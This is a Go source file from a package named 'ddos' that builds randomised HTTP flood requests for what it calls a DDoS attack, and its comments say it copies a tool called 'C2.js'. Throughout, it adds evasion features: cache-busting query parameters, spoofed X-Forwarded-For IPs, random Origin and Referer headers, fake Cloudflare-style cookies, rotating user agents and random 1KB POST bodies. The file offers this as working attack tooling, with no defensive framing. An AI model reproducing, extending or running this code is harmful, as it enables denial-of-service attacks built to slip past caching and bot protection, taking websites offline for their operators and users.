package ddos

import (
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// RequestBuilder builds HTTP requests with randomization support
type RequestBuilder struct {
	baseURL            string
	method             string
	baseHeaders        map[string]string
	endpoints          []string
	randomizationLevel int
	rng                *rand.Rand
	rngMu              sync.Mutex // Protects rng (not thread-safe)
	userAgents         []string
	userAgentIndex     int64 // Atomic counter for round-robin
	userAgentCount     int   // Cached length for performance (avoids len() calls)
}

// NewRequestBuilder creates a new request builder
// Always enables randomization (level 2: headers + query params)
// Always enables user agent rotation (built-in or custom file)
func NewRequestBuilder(config DDoSConfig) *RequestBuilder {
	// Load user agents (custom file or built-in - always enabled)
	// Use same optimized loading as DDoSAttack for consistency
	var userAgents []string
	if config.UserAgentFile != "" {
		if agents, err := loadUserAgentsFromFile(config.UserAgentFile); err == nil && len(agents) > 0 {
			userAgents = agents
		} else {
			// Fallback to built-in if file loading fails
			userAgents = getBuiltInUserAgents()
		}
	} else {
		// Auto-load from default user-agent.txt file (same as DDoSAttack)
		if agents, err := loadUserAgentsFromDefaultFile(); err == nil && len(agents) > 0 {
			userAgents = agents
		} else {
			// Fallback to built-in user agents if file loading fails
			userAgents = getBuiltInUserAgents()
		}
	}

	builder := &RequestBuilder{
		baseURL:            config.TargetURL,
		method:             config.Method,
		baseHeaders:        make(map[string]string),
		endpoints:          []string{"/"}, // Default to root path
		randomizationLevel: 2,             // Always enable: headers + query params
		rng:                rand.New(rand.NewSource(time.Now().UnixNano())),
		userAgents:         userAgents,      // Always enabled (built-in or custom)
		userAgentCount:     len(userAgents), // Cache length for performance
	}

	// Copy base headers
	for k, v := range config.Headers {
		builder.baseHeaders[k] = v
	}

	return builder
}

// BuildRequest builds a randomized HTTP request (optimized for zero-copy)
func (rb *RequestBuilder) BuildRequest() (*http.Request, error) {
	// Select endpoint (lock-free)
	endpoint := rb.SelectEndpoint()

	// Build URL with cache-busting if enabled
	fullURL := rb.baseURL
	if !strings.HasSuffix(fullURL, "/") && !strings.HasPrefix(endpoint, "/") {
		fullURL += "/"
	}
	fullURL += strings.TrimPrefix(endpoint, "/")

	// Add cache-busting parameters if randomization level >= 1
	if rb.randomizationLevel >= 1 {
		fullURL = rb.AddCacheBustingParams(fullURL)
	}

	// Create request with body for POST/PUT methods (like C2.js)
	var req *http.Request
	var err error
	var bodyData string
	if rb.method == "POST" || rb.method == "PUT" {
		// Generate random body data like C2.js (1KB of random data)
		bodyData = rb.randomString(1024)
		bodyReader := strings.NewReader(bodyData)
		req, err = http.NewRequest(rb.method, fullURL, bodyReader)
		if err == nil {
			// Set GetBody so the request can be reused (required for connection pooling)
			req.GetBody = func() (io.ReadCloser, error) {
				return io.NopCloser(strings.NewReader(bodyData)), nil
			}
		}
	} else {
		req, err = http.NewRequest(rb.method, fullURL, nil)
	}
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	// Set base headers
	for k, v := range rb.baseHeaders {
		req.Header.Set(k, v)
	}

	// Set default headers if not present (enhanced like C2.js)
	if req.Header.Get("User-Agent") == "" {
		req.Header.Set("User-Agent", rb.getRandomUserAgent())
	}
	if req.Header.Get("Accept") == "" {
		// Enhanced Accept header like C2.js for better browser simulation
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	}
	if req.Header.Get("Accept-Language") == "" {
		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	}
	if req.Header.Get("Accept-Encoding") == "" {
		// Add Accept-Encoding like C2.js
		req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	}
	if req.Header.Get("Connection") == "" {
		req.Header.Set("Connection", "keep-alive")
	}
	if req.Header.Get("Cache-Control") == "" {
		// Add Cache-Control like C2.js
		req.Header.Set("Cache-Control", "no-cache")
	}
	if req.Header.Get("Pragma") == "" {
		// Add Pragma like C2.js
		req.Header.Set("Pragma", "no-cache")
	}
	if req.Header.Get("Upgrade-Insecure-Requests") == "" {
		// Add Upgrade-Insecure-Requests like C2.js
		req.Header.Set("Upgrade-Insecure-Requests", "1")
	}
	// Set Content-Type for POST/PUT requests (like C2.js)
	if (rb.method == "POST" || rb.method == "PUT") && req.Header.Get("Content-Type") == "" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	// Randomize headers if level >= 2
	if rb.randomizationLevel >= 2 {
		rb.RandomizeHeaders(req)
	}

	// Randomize user agent if level >= 3
	if rb.randomizationLevel >= 3 {
		req.Header.Set("User-Agent", rb.getRandomUserAgent())
	}

	return req, nil
}

// AddCacheBustingParams adds cache-busting query parameters to URL
func (rb *RequestBuilder) AddCacheBustingParams(urlStr string) string {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		return urlStr
	}

	q := parsedURL.Query()
	q.Set("_t", strconv.FormatInt(time.Now().UnixNano(), 10))
	q.Set("_r", rb.randomString(8))
	parsedURL.RawQuery = q.Encode()

	return parsedURL.String()
}

// RandomizeHeaders adds random headers to the request (enhanced like C2.js)
func (rb *RequestBuilder) RandomizeHeaders(req *http.Request) {
	// Add random X-Request-ID
	req.Header.Set("X-Request-ID", rb.randomString(16))

	// Add random X-Forwarded-For (like C2.js fake IP)
	req.Header.Set("X-Forwarded-For", rb.randomIP())

	// Add random Origin header (like C2.js)
	req.Header.Set("Origin", rb.randomOrigin())

	// Add random Referer (like C2.js - always add for better simulation)
	req.Header.Set("Referer", rb.randomReferer())

	// Add random Cookie (like C2.js cloudscraper cookies)
	// Generate realistic-looking cookies
	req.Header.Set("Cookie", rb.randomCookie())
}

// endpointCounter is a package-level atomic counter for lock-free endpoint selection
var endpointCounter int64

// SelectEndpoint selects a random endpoint from the list (lock-free using atomic counter)
func (rb *RequestBuilder) SelectEndpoint() string {
	if len(rb.endpoints) == 0 {
		return "/"
	}
	// Use atomic counter for lock-free selection (good enough for load balancing)
	// This avoids lock contention in hot path
	idx := int(atomic.AddInt64(&endpointCounter, 1)-1) % len(rb.endpoints)
	if idx < 0 {
		idx = -idx
	}
	return rb.endpoints[idx]
}

// getRandomUserAgent returns a random user agent (atomic, lock-free)
// Optimized for high-frequency calls: uses cached length
func (rb *RequestBuilder) getRandomUserAgent() string {
	// Fast path: check cached length (avoids len() call on hot path)
	if rb.userAgentCount == 0 {
		return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	}
	// Atomic increment and modulo - lock-free, highly concurrent
	idx := atomic.AddInt64(&rb.userAgentIndex, 1) - 1
	return rb.userAgents[int(idx)%rb.userAgentCount]
}

// randomString generates a random string of specified length
// Optimized: single lock acquisition for entire string generation
func (rb *RequestBuilder) randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	// Single lock acquisition for entire operation (reduces lock contention)
	rb.rngMu.Lock()
	charsetLen := len(charset)
	for i := range b {
		b[i] = charset[rb.rng.Intn(charsetLen)]
	}
	rb.rngMu.Unlock()
	return string(b)
}

// randomIP generates a random IP address
// Optimized: single lock acquisition for all IP components
func (rb *RequestBuilder) randomIP() string {
	rb.rngMu.Lock()
	ip1 := rb.rng.Intn(255) + 1
	ip2 := rb.rng.Intn(255) + 1
	ip3 := rb.rng.Intn(255) + 1
	ip4 := rb.rng.Intn(255) + 1
	rb.rngMu.Unlock()
	return fmt.Sprintf("%d.%d.%d.%d", ip1, ip2, ip3, ip4)
}

// refererCounter is a package-level atomic counter for lock-free referer selection
var refererCounter int64

// randomReferer generates a random referer URL (enhanced like C2.js)
// Optimized: use atomic counter for lock-free selection
func (rb *RequestBuilder) randomReferer() string {
	domains := []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://www.yahoo.com/",
		"https://www.facebook.com/",
		"https://www.twitter.com/",
		"https://www.reddit.com/",
		"https://www.youtube.com/",
		"https://www.amazon.com/",
		"https://www.wikipedia.org/",
	}
	// Use atomic counter for lock-free selection (good enough for load balancing)
	idx := int(atomic.AddInt64(&refererCounter, 1)-1) % len(domains)
	if idx < 0 {
		idx = -idx
	}
	// Add random path like C2.js does (generate path without nested lock)
	rb.rngMu.Lock()
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	pathBytes := make([]byte, 10)
	charsetLen := len(charset)
	for i := range pathBytes {
		pathBytes[i] = charset[rb.rng.Intn(charsetLen)]
	}
	rb.rngMu.Unlock()
	return domains[idx] + string(pathBytes)
}

// randomOrigin generates a random origin header (like C2.js)
func (rb *RequestBuilder) randomOrigin() string {
	rb.rngMu.Lock()
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	domainBytes := make([]byte, 8)
	charsetLen := len(charset)
	for i := range domainBytes {
		domainBytes[i] = charset[rb.rng.Intn(charsetLen)]
	}
	rb.rngMu.Unlock()
	return fmt.Sprintf("http://%s.com", string(domainBytes))
}

// randomCookie generates random cookies (like C2.js cloudscraper cookies)
func (rb *RequestBuilder) randomCookie() string {
	// Generate realistic cookie names and values
	cookieNames := []string{
		"__cf_bm", "__cfduid", "_ga", "_gid", "sessionid", "csrftoken",
		"PHPSESSID", "JSESSIONID", "ASP.NET_SessionId", "laravel_session",
	}
	rb.rngMu.Lock()
	cookieName := cookieNames[rb.rng.Intn(len(cookieNames))]
	// Generate cookie value directly to avoid nested lock
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	cookieValueBytes := make([]byte, 32)
	charsetLen := len(charset)
	for i := range cookieValueBytes {
		cookieValueBytes[i] = charset[rb.rng.Intn(charsetLen)]
	}
	rb.rngMu.Unlock()
	return fmt.Sprintf("%s=%s", cookieName, string(cookieValueBytes))
}
